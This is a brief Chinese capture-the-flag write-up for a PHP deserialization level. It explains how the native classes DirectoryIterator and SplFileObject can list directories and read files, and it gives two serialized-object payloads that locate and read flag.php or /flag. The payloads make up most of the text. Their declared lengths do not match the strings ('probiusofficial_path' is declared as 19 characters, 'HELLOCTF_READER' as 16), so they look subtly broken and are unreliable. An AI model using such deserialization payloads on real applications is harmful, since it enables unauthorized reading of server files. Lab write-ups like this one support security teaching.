# WriteUP · Level 24 · 原生类利用

## 原理

没有 eval / system 时,PHP 的原生类可以充当 sink:

- `DirectoryIterator` —— 遍历目录,列文件名;
- `SplFileObject` —— 按行读取文件内容。

两者都通过 `__toString` 在页面 `echo` 时被触发。

## 第一步:列目录

```
o=O:7:"TJ_ITER":1:{s:19:"probiusofficial_path";s:1:".";}
```

输出当前目录文件列表,发现 `flag.php`。

## 第二步:读文件

```
o=O:16:"HELLOCTF_READER":1:{s:7:"tj_file";s:8:"flag.php";}
```

读出 flag.php 内容(动态容器中 flag 位于 /flag,相应改为 /flag)。

